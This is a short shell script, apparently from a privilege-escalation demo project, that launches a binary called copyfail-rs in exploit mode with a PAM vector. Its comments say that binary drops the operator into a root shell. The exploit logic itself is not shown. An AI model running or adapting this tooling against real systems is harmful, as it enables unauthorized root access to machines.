#!/bin/sh
# copyfail-pwn.sh — thin wrapper around the single-binary CopyFail demo.
#
# As of S2.7 the binary itself drops the operator into a root shell when run
# from a TTY — this wrapper exists for backwards compatibility with anything
# that was calling the script directly. New users should just run the binary:
#
#     ./copyfail-rs --mode exploit
#
# Usage:
#   ./copyfail-pwn.sh [path/to/copyfail-rs]
# Default binary path: ./copyfail-rs in same directory as this script.

set -e

BIN="${1:-$(dirname "$0")/copyfail-rs}"
if [ ! -x "$BIN" ]; then
    echo "error: copyfail-rs binary not found or not executable at $BIN" >&2
    echo "usage: $0 [path/to/copyfail-rs]" >&2
    exit 1
fi

exec "$BIN" --mode exploit --vector pam
